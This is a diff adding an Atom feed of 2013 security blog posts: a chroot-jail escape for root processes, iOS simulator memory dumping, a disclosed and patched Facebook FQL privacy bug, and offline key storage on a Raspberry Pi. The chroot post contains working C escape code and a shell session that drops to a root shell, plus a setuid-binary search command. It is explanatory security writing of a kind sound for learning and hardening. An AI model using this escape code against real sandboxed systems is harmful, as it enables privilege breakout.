@@ -1,0 +1,297 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: security | PyTux]]></title>
+  <link href="http://filosottile.github.com/categories/security/atom.xml" rel="self"/>
+  <link href="http://filosottile.github.com/"/>
+  <updated>2013-10-14T16:40:02-04:00</updated>
+  <id>http://filosottile.github.com/</id>
+  <author>
+    <name><![CDATA[Filippo Valsorda]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Escaping a chroot jail/1]]></title>
+    <link href="http://filosottile.github.com/escaping-a-chroot-jail-slash-1/"/>
+    <updated>2013-10-14T10:00:00-04:00</updated>
+    <id>http://filosottile.github.com/escaping-a-chroot-jail-slash-1</id>
+    <content type="html"><![CDATA[<p>Everybody will tell you that a <a href="https://en.wikipedia.org/wiki/Chroot#Uses">chroot jail</a> (that is, making a process think that a directory is instead the root folder, and not letting it access or modify anything outside of that) is ineffective against a process with root privileges<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> (UID 0). Let’s see why.</p>
+
+<!-- more -->
+
+<p>The escape basically works like this:</p>
+
+<ul>
+  <li>
+    <p>We create a temporary folder (I named mine <code>.42</code>, hidden not to draw too much attention) and we <code>chroot</code> to that, this way we make sure our current working directory is outside the fake root, and we can do so because we’re <del>CEO</del>root, Bitch<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>;</p>
+  </li>
+  <li>
+    <p>then we <code>chroot</code> to parent folders all the way up to the root (we don’t need to worry about going too up, <code>/../../.. == /</code>);</p>
+  </li>
+  <li>
+    <p>finally we spawn something, a shell, <code>rm -rf</code>, whatever.</p>
+  </li>
+</ul>
+
+<p>Q: Why couldn’t we just do <code>chroot("../../../../../../..")</code> and call it a day?<br />
+A: Because even if the kernel does not want to keep us from doing what we want (we’re root, after all) it will keep faith to the chroot also with us and if from inside the chroot jail we ask to <code>chroot("..")</code> the kernel will regularly expand <code>/..</code> to <code>/</code>. It has to do so, some programs might rely on that. So we have to move our working directory outside of the root before proceeding.</p>
+
+<p><div><script src='https://gist.github.com/6976188.js?file=unchroot.txt'></script>
+<noscript><pre><code>$ echo 1337 | sudo tee /FLAG
+1337
+$ mkdir chroot
+$ cd chroot/
+$ mkdir bin etc lib var home
+$ ln -s lib lib64
+$ ldd /bin/sh
+    linux-vdso.so.1 =&gt;  (0x00007fffa9c83000)
+    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a29106000)
+    /lib64/ld-linux-x86-64.so.2 (0x00007f9a294d8000)
+$ cp /bin/sh bin
+$ cp /lib/x86_64-linux-gnu/libc.so.6 lib
+$ cp /lib64/ld-linux-x86-64.so.2 lib
+$ tree
+.
+├── bin
+│   └── sh
+├── etc
+├── home
+├── lib
+│   ├── ld-linux-x86-64.so.2
+│   └── libc.so.6
+├── lib64 -&gt; lib
+└── var
+
+6 directories, 3 files
+$
+$ cat &gt; unchroot.c
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    mkdir(&quot;.42&quot;, 0755);
+    chroot(&quot;.42&quot;);
+    chroot(&quot;../../../../../../../../../../../../../../../..&quot;);
+    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
+}
+$ gcc -static -o unchroot unchroot.c
+$
+$ sudo chroot . /bin/sh
+# ls
+/bin/sh: 1: ls: not found
+# ./unchroot
+# ls
+bin    dev   home            lib         media  proc  sbin     sys  var
+boot   etc   initrd.img      lib64       mnt    root  selinux  tmp  vmlinuz
+cdrom  FLAG  initrd.img.old  lost+found  opt    run   srv      usr  vmlinuz.old
+# cat FLAG
+1337
+#</code></pre></noscript></div>
+</p>
+
+<h2 id="other-pitfalls">Other pitfalls</h2>
+
+<p>If <code>chroot()</code> changes also the working directory to be inside the jail this will make it impossible to pop outside by just chrooting to a sub-directory, but this will not stop us.</p>
+
+<p>We can simply grab the file descriptor of the current directory before the first chroot call and then <a href="http://linux.die.net/man/2/fchdir"><code>fchdir()</code></a> to that. <code>chroot()</code> <a href="http://linux.die.net/man/2/chroot">does not close file descriptors</a>.</p>
+
+<p>Also, if the root privileges were incorrectly dropped, for example by calling <a href="http://linux.die.net/man/2/seteuid"><code>seteuid()</code></a>, a call to <code>setuid(0)</code> might be useful in restoring them.</p>
+
+<h2 id="so-how-does-a-correct-chroot-look-like">So, how does a correct chroot look like?</h2>
+
+<p><code>c
+assert(UID &gt; 0);
+chdir("jail");
+chroot(".");
+setuid(UID);
+</code></p>
+
+<p>And make sure that there are no <a href="https://en.wikipedia.org/wiki/Setuid"><code>setuid</code></a> binaries inside the jail<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>!</p>
+
+<h2 id="a-catch-all-compile-everywhere-c-unchroot">A catch-all compile-everywhere C <code>unchroot</code></h2>
+
+<p><div><script src='https://gist.github.com/6976188.js?file=unchroot.c'></script>
+<noscript><pre><code>#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+
+int main() {
+    int dir_fd, x;
+    setuid(0);
+    mkdir(&quot;.42&quot;, 0755);
+    dir_fd = open(&quot;.&quot;, O_RDONLY);
+    chroot(&quot;.42&quot;);
+    fchdir(dir_fd);
+    close(dir_fd);  
+    for(x = 0; x &lt; 1000; x++) chdir(&quot;..&quot;);
+    chroot(&quot;.&quot;);  
+    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
+}</code></pre></noscript></div>
+</p>
+
+<hr />
+
+<div class="footnotes">
+  <ol>
+    <li id="fn:1">
+      <p>Or even just the CAP_SYS_CHROOT privilege (that self-chroot jailing processes often forget to drop), most of the cases we just need to be able to run <code>chroot()</code>.<a href="#fnref:1" rel="reference">&#8617;</a></p>
+    </li>
+    <li id="fn:2">
+      <p><a href="http://galeri4.uludagsozluk.com/105/im-ceo-bitch_182484.jpg">Ahem</a>.<a href="#fnref:2" rel="reference">&#8617;</a></p>
+    </li>
+    <li id="fn:3">
+      <p><code>find / -type f \( -perm -4000 -o -perm -2000 \)</code><a href="#fnref:3" rel="reference">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Dumping the iOS simulator memory]]></title>
+    <link href="http://filosottile.github.com/dumping-the-ios-simulator-memory/"/>
+    <updated>2013-09-12T18:26:00-04:00</updated>
+    <id>http://filosottile.github.com/dumping-the-ios-simulator-memory</id>
+    <content type="html"><![CDATA[<p>To audit memory or to debug with external tools it can be useful to get a <strong>dump of the running memory of an app</strong>.</p>
+
+<p>To do so on a device you’ll need a Jailbreak, SSH access, and <code>gdb</code>. See <a href="https://www.soldierx.com/tutorials/iPhone-Dumping-Game-Memory-and-Injecting-Custom-Code-into-Games">this</a> or <a href="http://rce64.wordpress.com/2013/01/26/decrypting-apps-on-ios-6-single-architecture-no-pieaslr/">this</a>.</p>
+
+<p>If instead you’re up to a simulated app, things are easier: apps running in the simulator are actually just <em>native processes</em> on your Mac OS X.</p>
+
+<p>So, how to get a core dump of a Mac OS X process? Sadly gdb <a href="http://sourceware.org/gdb/onlinedocs/gdb/Core-File-Generation.html">can’t do so</a>. <em>Mac OS X Internals</em> comes to the rescue with <a href="http://osxbook.com/book/bonus/chapter8/core/">this</a> article.</p>
+
+<p>It is actually an interesting read, but if you are in a hurry, skip to downloading <a href="http://osxbook.com/book/bonus/chapter8/core/download/gcore.c">the code</a> and compile it like this (screw the Makefile, it compiles also for PowerPC)</p>
+
+<pre><code>gcc -O2 -arch i386 -Wall -o gcore gcore.c
+gcc -O2 -arch x86_64 -Wall -o gcore64 gcore.c
+</code></pre>
+
+<p>Then simply run your app, find the process id <code>grep</code>-ping <code>ps -hax</code> and run</p>
+
+<pre><code>sudo gcore 1234
+</code></pre>
+
+<p>And enjoy your core dump. (Bonus: you can load it up in <code>gdb</code>)</p>
+
+<p>If you happen to want the dump happen at a particular moment, place a regular breakpoint in XCode, then dump the memory when the process is paused.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[A bug worth 4200$]]></title>
+    <link href="http://filosottile.github.com/a-bug-worth-4200%24/"/>
+    <updated>2013-04-26T13:04:00-04:00</updated>
+    <id>http://filosottile.github.com/a-bug-worth-4200$</id>
+    <content type="html"><![CDATA[<p><strong>tl;dr</strong> I found a vulnerability in Facebook that allowed anyone to see the “strength” of all his friends’ friendships via a FQL query authenticated with an iOS app access token. The reporting experience has been smooth and not too slow, and the bounty generous.</p>
+
+<p class="img_right"><a href="https://www.facebook.com/BugBounty"><img src="/images/BugBounty.png" alt="Facebook Bug Bounty" /></a></p>
+
+<p>Early this year Facebook started showing “<em>last active</em>” times above chats in the iOS app but not on the website (they now have rolled out it also in the website) and I started wondering if I could get that info also from my browser and maybe wrap it up in a extension or something (turns out visiting <code>m.facebook.com</code> would have been enough, but emh…). So, I started <a href="http://portswigger.net/burp/proxy.html">Burp Proxy</a> with SSL interception, trusted the Burp CA on my iPad and started inspecting the Facebook iOS app calls.</p>
+
+<!-- more -->
+
+<p>They are mainly <a href="https://developers.facebook.com/docs/technical-guides/fql/"><strong>FQL multiqueries</strong></a>, and one in particular caught my eye (<code>queries</code> parameter URLDecoded for readability):</p>
+
+<pre><code>GET /method/fql.multiquery?sdk=ios&amp;queries={"top_friends":"SELECT uid, online_presence, is_pushable, has_messenger, last_active FROM user WHERE uid in (SELECT uid2 FROM friend WHERE uid1=me() order by communication_rank desc LIMIT 15)","online":"SELECT uid, is_pushable, has_messenger FROM user WHERE online_presence ='active' AND uid IN (SELECT uid2 FROM friend WHERE uid1=me())","favorites":"SELECT uid, online_presence, is_pushable, has_messenger, last_active FROM user WHERE uid in (SELECT favorite_id FROM messaging_favorite WHERE uid=me())","favoriteRanking":"SELECT favorite_id, ordering FROM messaging_favorite WHERE uid=me()"}&amp;sdk_version=2&amp;access_token=REDACTED&amp;format=json&amp;locale=it_IT
+</code></pre>
+
+<p>These are a bunch of queries against the <code>user</code> table based on JOINs on the <code>messaging_favorite</code> and <code>friend</code> tables. This <code>friend</code> table is interesting: it holds all the friendships with their details, for example <strong><code>communication_rank</code></strong>. By fiddling around a bit with it I guessed that it is a rank of the <em>“strength”</em> of <code>uid1</code>’s friendship with <code>uid2</code>, probably the thing that decides who’s shown in your chat sidebar even when he’s offline.</p>
+
+<p>The <a href="https://developers.facebook.com/docs/reference/fql/friend">docs</a> tell us that “[the access token owner is] the only user that this table can be queried for, the friends of friends cannot be retrieved”. Hmm. Should we trust the docs? Turns out, <strong>NO</strong>! ;)</p>
+
+<p>Authenticating with our iOS app access token we can issue queries like</p>
+
+<pre><code>SELECT uid2, communication_rank FROM friend WHERE uid1=1289695510 ORDER BY communication_rank DESC
+</code></pre>
+
+<p>for an arbitrary friend’s <code>uid1</code> (the above is the one of my favorite guinea pig, Anna) instead of just for ours. That queries return output like</p>
+
+<pre><code>{ "uid2": "1234567890", "communication_rank": "2.4456558227539" },
+{ "uid2": "4242424242", "communication_rank": "1.68115234375" },
+{ "uid2": "1337133713", "communication_rank": "1.602783203125" },
+...
+</code></pre>
+
+<p>that tells us with which users the target contacts most, maybe the most interesting and private bit of information after message logs. We don’t even need to be friends of that users!</p>
+
+<h2 id="reporting-and-patching">Reporting and patching</h2>
+
+<p>The first time I reported the issue through <a href="https://www.facebook.com/whitehat/report/">their form</a> it got dismissed, probably also because I didn’t explain it very well. After offering a real world example they confirmed and quickly patched it.</p>
+
+<p>The report netted me a generous 4200$ bounty (delivered as a cool prepaid card, that is worth the withdrawal fee) and a mention on <a href="https://www.facebook.com/whitehat/thanks/">their thanks page</a> (a great, great CV builder), plus some pleasant compliments.</p>
+
+<p class="img_center"><img src="/images/whitehat.png" alt="White Hat Bounty" /></p>
+
+<p>Facebook offers a great example of how to run a Bug Bounty Program: assure the researcher that he’s being heard, offer him a direct contact (you get ticket-bound <em>Reply-To</em>s) by skilled people, reward him generously (even if, believe me or not, this is the most optional point), publicly thank him and finally let him feel that his work is appreciated.</p>
+
+<h2 id="vulnerability-timeline">Vulnerability timeline</h2>
+
+<table>
+  <tbody>
+    <tr>
+      <td>1 gen 2013</td>
+      <td><strong>Vulnerability discovered and bug report filed</strong></td>
+    </tr>
+    <tr>
+      <td>7 gen 2013</td>
+      <td>Test accounts POC sent</td>
+    </tr>
+    <tr>
+      <td>18 gen 2013</td>
+      <td>First dismissing reply received</td>
+    </tr>
+    <tr>
+      <td>19 gen 2013</td>
+      <td><strong>Better explanation and real-users POC sent</strong></td>
+    </tr>
+    <tr>
+      <td>28 gen 2013</td>
+      <td>Vulnerability confirmed and acknowledged</td>
+    </tr>
+    <tr>
+      <td>~ 30 gen 2013</td>
+      <td><strong>Vulnerability fixed</strong></td>
+    </tr>
+    <tr>
+      <td>1 feb 2013</td>
+      <td>Bounty awarded</td>
+    </tr>
+    <tr>
+      <td>18 mar 2013</td>
+      <td>Bounty paid</td>
+    </tr>
+    <tr>
+      <td>26 apr 2013</td>
+      <td>This public disclosure</td>
+    </tr>
+  </tbody>
+</table>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Offline storage on a RPi]]></title>
+    <link href="http://filosottile.github.com/offline-storage-on-a-rpi/"/>
+    <updated>2013-02-22T23:21:00-05:00</updated>
+    <id>http://filosottile.github.com/offline-storage-on-a-rpi</id>
+    <content type="html"><![CDATA[<p>The only really secure place for data is <strong>an <a href="https://en.wikipedia.org/wiki/Air_gap_(networking)">offline</a> computer</strong>.</p>
+
+<p>A couple of use cases: <a href="http://wiki.debian.org/subkeys">store your primary <strong>GPG key</strong> offline</a>, without expire date, then generate a couple of subkeys with 1y expiration and use them day to day. This way you will need your primary key only to issue/revoke subkeys or to sign other people keys (and no need to waste all your signatures every time your key expire).
+Or, <a href="http://bitcoinarmory.com/using-offline-wallets-in-armory/">create a cold wallet for <strong>Bitcoin</strong> with Armory</a> and authorize all transactions from the offline machine while monitoring them from the online one.
+And there are much more examples of data best kept offline…</p>
+
+<p>But not everybody has money and space to keep a rarely used computer around only to store a couple of keys.</p>
+
+<p>My solution is to use a <strong>Raspberry Pi</strong> with a <em>dedicated SD card</em>. Budget: <strong>10$</strong> for the SD (every good nerd already has a RPi, right?). Space: negligible.</p>
+
+<p>If you don’t know what a RPi is, <a href="http://www.raspberrypi.org/faqs">it is a credit card sized computer with Ethernet, USB, HDMI that costs 35$</a>. Now you either want to buy one or you stumbled here by accident.</p>
+
+<p>It’s simple: just download <a href="http://www.raspbian.org/">Raspbian</a>, <strong>unplug Ethernet</strong>, install Gnupg and <a href="https://gist.github.com/FiloSottile/3646033">Armory</a> and transfer data with any USB key! <em>Finish!</em> And now you have highest grade security on the cheap.</p>
+
+]]></content>
+  </entry>
+  
+</feed>
